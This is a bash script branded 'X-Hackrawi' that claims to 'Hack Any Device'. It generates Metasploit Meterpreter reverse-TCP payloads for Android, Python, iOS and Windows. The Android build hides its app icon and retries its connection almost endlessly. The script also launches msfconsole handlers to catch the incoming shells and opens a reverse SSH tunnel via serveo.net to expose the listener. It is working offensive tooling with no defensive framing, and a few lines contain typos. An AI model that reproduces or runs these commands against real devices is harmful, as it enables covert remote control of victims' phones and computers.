#!/bin/bash
clear
red='\e[1;31m'
green='\e[1;32m' 
blue='\e[1;34m' 
purple='\e[1;35m'
cyan='\e[1;36m' 
white='\e[1;37m'
yellow='\e[1;33m'

echo -e $green '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ##
echo -e $red '__   __     _    _            _                       _'
echo -e $red '\ \ / /    | |  | |          | |                     (_)'
echo -e $red ' \ V /_____| |__| | __ _  ___| | ___ __ __ ___      ___'
echo -e $red '  > <______|  __  |/ _` |/ __| |/ / __/ _` \ \ /\ / / \'
echo -e $red ' / . \     | |  | | (_| | (__|   <| | | (_| |\ V  V /| |'
echo -e $red '/_/ \_\    |_|  |_|\__,_|\___|_|\_\_|  \__,_| \_/\_/ |_|'
echo " "
echo -e $green "         WhatsApp>     +1 3528884445"

echo ##
echo -e $green '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'



echo ""
echo -e $red 'Welcome To X-Hackrawi  2020 U can Hack Any Device with me '
echo ""
echo -e $green '{-1-}' $red '--Create A Payload'
echo ""
echo -e $green '{-2-}' $red '--Hack A Device'
echo ""
echo -e $green '{-3-}' $red '--install ssh'
echo ""
echo -e $green '{-4-}' $red '--start port'
echo ""
echo -e $green '{-5-}' $red '--Install MetaSploit Framework'
echo ""
echo -e $green '{-0-}' $red '--exit '
echo ""
echo -e $white "Insert A Number "

read -p "insert num :> " menu

if [ $menu = 1 ]
then
clear 

echo -e $green '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ##
echo -e $red '__   __     _    _            _                       _'
echo -e $red '\ \ / /    | |  | |          | |                     (_)'
echo -e $red ' \ V /_____| |__| | __ _  ___| | ___ __ __ ___      ___'
echo -e $red '  > <______|  __  |/ _` |/ __| |/ / __/ _` \ \ /\ / / \'
echo -e $red ' / . \     | |  | | (_| | (__|   <| | | (_| |\ V  V /| |'
echo -e $red '/_/ \_\    |_|  |_|\__,_|\___|_|\_\_|  \__,_| \_/\_/ |_|'
echo -e #green "         WhatsApp>     +1 3528884445"

echo ##
echo -e $green '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'


echo ""
echo -e $red 'welcome in X-Hackrawi  2020 U can Hack any Device with me '
echo ""
echo -e $green '{-1-}' $red '--payload ~Android --'
echo ""
echo -e $green '{-2-}' $red '--payload ~Python --'
echo ""
echo -e $green '{-3-}' $red '--payload ~IOS --'
echo ""
echo -e $green '{-4-}' $red '--payload ~Windows --'
echo ""
echo -e $green '{-00-}' $red '--back '

echo ""
echo -e $white "Insert A Number "

read -p "insert :> " payload
if [ $payload = 1 ]
then 
echo -e $red " Please Insert LHOST :>"
read -p "insert LHOST :> " lhost0
echo " "
echo -e $red " Please Iinsert LPORT :>"
read -p "insert LPORT :> " lport0
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost0 LPORT=$lport0 AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" AndroidHideAppIcon="true" -o pyload.apk
echo -e $green"Payload Bas Been Created ✔"
sleep 1
bash X-Hackrawi.sh
fi
if [ $payload = 2 ]
then 
echo -e $red " Please Insert LHOST :>"
read -p "insert LHOST :> " lhost
echo -e $red " Please Insert LPORT :>"
read -p "insert LPORT :> " lport
msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.py
bash X-Hackrawi.sh
fi
if [ $payload = 3 ]
then 
echo -e $red " please insert LHOST :>"/
read -p "insert LHOST :>" lhost
echo -e $red " please insert LPORT :>"
read -p "insert LPORT :>" lport
msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.ios
bash X-Hackrawi.sh
fi
if [ $payload = 4 ]
then 
echo -e $red " please insert LHOST :>"
read -p "insert LHOST :>" lhost
echo -e $red " please insert LPORT :>"
read -p "insert LPORT :>" lport
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o hack.exe
bash X-Hackrawi.sh
fi
if [ $payload = 00 ]
then
clear
bash X-Hackrawi.sh
fi
fi

if [ $menu = 2 ]
then
clear 

echo -e $green '++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
echo ##
echo -e $red '__   __     _    _            _                       _'
echo -e $red '\ \ / /    | |  | |          | |                     (_)'
echo -e $red ' \ V /_____| |__| | __ _  ___| | ___ __ __ ___      ___'
echo -e $red '  > <______|  __  |/ _` |/ __| |/ / __/ _` \ \ /\ / / \'
echo -e $red ' / . \     | |  | | (_| | (__|   <| | | (_| |\ V  V /| |'
echo -e $red '/_/ \_\    |_|  |_|\__,_|\___|_|\_\_|  \__,_| \_/\_/ |_|'
echo -e #green "         WhatsApp>     +1 3528884445"

echo ##
echo -e $green '+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++'


echo ""
echo -e $red 'welcome in X-Hackrawi  2020 U can Hack any Device with me '
echo ""
echo -e $red "Please Insert Payload Type "
read -p "insert payload type :>" type
if [ $type = "apk" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert LPORT"
read -p "insert LPORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'

fi 
if [ $type = "py" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert PORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'

fi 
if [ $type = "ios" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert PORT"
read -p "insert PORT :>" port
msfconsole -x 'use multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
fi 
if [ $type = "exe" ]
then
echo -e $white "Please Insert LHOST"
read -p "insert LHOST :>" host
echo -e $white "Please Insert LPORT"
read -p "insert LPORT :>" port
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
fi 
fi 
if [ $menu = 3 ]
then
echo -e $red"Downlading SSH..."
apt install openssh -y
echo /-e $green"SSH Has Been Downloaded ✔"
clear
bash X-Hackrawi.sh
fi
if [ $menu = 4 ]
then
echo ""
read -p "Please Insert PORT :>" port
echo ""
ssh -R $port:localhost:4444 serveo.net
clear
bash X-Hackrawi.sh
fi
if [ $menu = 5 ]
then
echo -e $red
figlet MSF
echo " "
echo -e $green "Downloading metasploit , this could take a while ..."
apt update -y
apt install unstable-repo
apt install metasploit
echo " "
echo -e $green "MSF Has Been Downloaded ✔"
sleep 2
bash X-Hackrawi.sh
fi
if [ $menu = 0 ]
then
clear 
figlet -f banner.flf "Good Bye"
exit

fi



